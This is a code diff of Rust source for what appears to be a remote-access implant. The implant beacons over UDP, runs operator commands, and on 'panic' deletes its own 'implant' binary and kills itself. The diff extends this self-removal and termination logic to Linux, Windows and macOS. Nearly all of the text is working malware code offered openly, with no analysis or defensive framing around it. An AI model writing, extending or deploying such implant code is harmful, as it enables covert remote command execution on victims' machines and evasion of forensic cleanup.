@@ -1,9 +1,12 @@
 #![feature(type_ascription)]
 
+extern crate sys_info;
+
 use std::net::UdpSocket;
 use std::thread::sleep;
 use std::time;
 use std::process::{Command,Stdio,id};
+use sys_info::os_type;
 
 static mut beacontime: u64 = 20;
 static sockettime: u64 = 25;
@@ -47,14 +50,36 @@ fn execution(socket: &mut UdpSocket,buf: &mut [u8]) {
     if string2[0]=="beacon" {
         unsafe {beacontime : u64 =  string2[1].parse::<u64>().unwrap();}
     } else if string2[0]=="panic" {
-        let pid = id().to_string();
-        socket.send(b"");
-        Command::new("rm").arg("-f").arg("implant").output().expect("failed to execute");
-        Command::new("kill").arg("-9").arg(&pid).output().expect("failed to execute");
+        if os_type().unwrap()=="Linux" {
+            let pid = id().to_string();
+            socket.send(b"");
+            Command::new("rm").arg("-f").arg("implant").output().expect("failed to execute");
+            Command::new("kill").arg("-9").arg(&pid).output().expect("failed to execute");
+        } else if os_type().unwrap()=="Windows" {
+            let pid = id().to_string();
+            socket.send(b"");
+            Command::new("del").arg("implant.exe").output().expect("failed to execute");
+            Command::new("taskkill").arg("/F").arg("/PID").arg(&pid).output().expect("failed to execute");
+        } else if os_type().unwrap()=="Darwin" {
+            let pid = id().to_string();
+            socket.send(b"");
+            Command::new("rm").arg("-f").arg("implant").output().expect("failed to execute");
+            Command::new("kill").arg("-9").arg(&pid).output().expect("failed to execute");
+        }       
     } else if string2[0]=="terminate" {
-        let pid = id().to_string();
-        socket.send(b"");
-        Command::new("kill").arg("-9").arg(&pid).output().expect("failed to execute");
+        if os_type().unwrap()=="Linux" {
+            let pid = id().to_string();
+            socket.send(b"");
+            Command::new("kill").arg("-9").arg(&pid).output().expect("failed to execute");
+        } else if os_type().unwrap()=="Windows" {
+            let pid = id().to_string();
+            socket.send(b"");
+            Command::new("taskkill").arg("/F").arg("/PID").arg(&pid).output().expect("failed to execute");
+        } else if os_type().unwrap()=="Darwin" {
+            let pid = id().to_string();
+            socket.send(b"");
+            Command::new("kill").arg("-9").arg(&pid).output().expect("failed to execute");
+        }
     } else if main_command.contains("|") {
         pipedexecution(socket, main_command.to_string());
     } else {
